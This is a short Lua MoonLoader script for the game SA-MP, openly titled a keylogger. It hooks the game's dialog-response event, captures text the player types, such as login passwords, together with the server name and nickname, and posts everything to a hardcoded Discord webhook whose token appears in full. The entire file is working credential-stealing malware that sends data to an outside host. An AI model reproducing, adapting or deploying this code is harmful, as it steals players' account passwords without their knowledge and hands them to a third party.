-- Keylogger by: Justk --
-- Version: 0.1 --
-- Programmed using: vscode.dev syntax:LUA --
--_  _ ____ _   _ _    ____ ____--       
--|_/  |___  \_/  |    |  | | __--       
--| \_ |___   |   |___ |__| |__I--    
                                     
--___  _   _   _ _  _ ____ ___ _  _--    
--|__]  \_/  . | |  | [__   |  |_/ --    
--|__]   |   ._| |__| ___]  |  | \_--    

--mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm--
--mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm--                                                    

require 'lib.moonloader'
local requests = require 'requests'
local sampev = require 'lib.samp.events'

function main()
    while not isSampAvailable() do
        wait(100)
    end
end

function sampev.onSendDialogResponse(satu,dua,tiga,inputtext)
    local servername = sampGetCurrentServerName()
    local boolean,id = sampGetPlayerIdByCharHandle(PLAYER_PED)
    local playerName = sampGetPlayerNickname(id) 
    local serverIP = sampGetServerIP()
    local serverPort = sampGetServerPort()

    sendToDiscord(string.format("server: %s username: %s password: %s", servername, playerName, inputtext))
end

function sendToDiscord(message)
    local webhook_url = "https://discord.com/api/webhooks/1311729481173700688/wLdX5OVGvsErQZHATXzuC_RL6Pqvh8eqXrqp9m2WR6l6g_vEx9IDueluL3Hge8OKZwB8"
    local response = requests.post{
        url = webhook_url,
        headers = {
            ["Content-Type"] = "application/json"
        },
        data = {
            content = message,
            username = "mata 2km"
        }
    }

end 